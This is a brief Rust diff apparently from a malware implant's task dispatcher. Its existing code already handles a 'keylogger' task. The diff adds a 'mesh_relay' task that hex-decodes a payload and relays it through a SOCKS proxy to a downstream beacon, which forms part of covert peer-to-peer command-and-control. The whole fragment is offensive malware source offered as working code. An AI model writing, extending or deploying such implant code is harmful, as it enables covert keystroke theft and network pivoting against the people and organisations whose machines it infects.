@@ -452,6 +452,14 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
                 "keylogger" => {
                     result = crate::modules::collection::Collection.keylogger_poll().into_bytes();
                 },
+                "mesh_relay" => {
+                    // Payload is a hex-encoded packet for a downstream beacon
+                    let packet = hex_decode(&task.payload);
+                    if let Some(proxy) = unsafe { (*core::ptr::addr_of_mut!(SOCKS_PROXY)).as_mut() } {
+                        // For MVP, we use the SOCKS proxy logic to relay P2P data if active
+                        result = proxy.process(&packet);
+                    }
+                },
                 _ => {
                     // Unknown task
                 }
